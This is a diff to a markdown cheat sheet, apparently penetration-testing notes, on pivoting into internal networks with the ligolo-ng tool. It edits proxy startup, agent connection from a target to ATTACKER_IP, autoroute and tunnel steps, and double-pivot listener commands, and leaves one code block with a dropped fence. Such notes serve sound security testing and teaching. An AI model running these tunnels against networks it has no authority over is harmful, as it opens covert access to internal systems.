@@ -34,13 +34,7 @@ sudo ip link set ligolo up
 ### 1. Start the Proxy (Attacker)
 ```bash
 # With self-signed certificate
-./proxy -selfcert -laddr 0.0.0.0:11601
-
-# With custom certificate
-./proxy -laddr 0.0.0.0:11601 -certfile cert.pem -keyfile key.pem
-
-# Verbose mode
-./proxy -selfcert -laddr 0.0.0.0:11601 -v
+./proxy -selfcert 
 ```
 
 ### 2. Connect the Agent (Target / Pivot Machine)
@@ -50,28 +44,16 @@ sudo ip link set ligolo up
 
 # Windows
 agent.exe -connect ATTACKER_IP:11601 -ignore-cert
-
-# Run in background (Linux)
-nohup ./agent -connect ATTACKER_IP:11601 -ignore-cert &
 ```
 
 ### 3. Set Up the Tunnel (Proxy Console)
 ```
 ligolo-ng » session          # Select the active session
 ligolo-ng » ifconfig         # View target network interfaces
-ligolo-ng » start            # Start the tunnel
+ligolo-ng » autoroute        # Configuration Auto Route
+ligolo-ng » start --tun ligolo            # Start the tunnel
 ```
 
-### 4. Add a Route (Attacker)
-```bash
-# Route to internal network
-sudo ip route add 192.168.1.0/24 dev ligolo
-
-# Another subnet
-sudo ip route add 10.10.10.0/24 dev ligolo
-```
-
----
 
 ## 🔁 Double Pivot
 
@@ -82,11 +64,9 @@ Attacker → Pivot1 → Pivot2 → Internal Network
 ### Open a New Listener on Pivot1
 ```
 ligolo-ng » listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601
-```
 
-### Connect Agent on Pivot2 to Pivot1
-```bash
-./agent -connect PIVOT1_IP:11602 -ignore-cert
+Host 2
+./agent -connect PIVOT1:11602 -ignore-cert
 ```
 
 ### Select New Session and Add Route
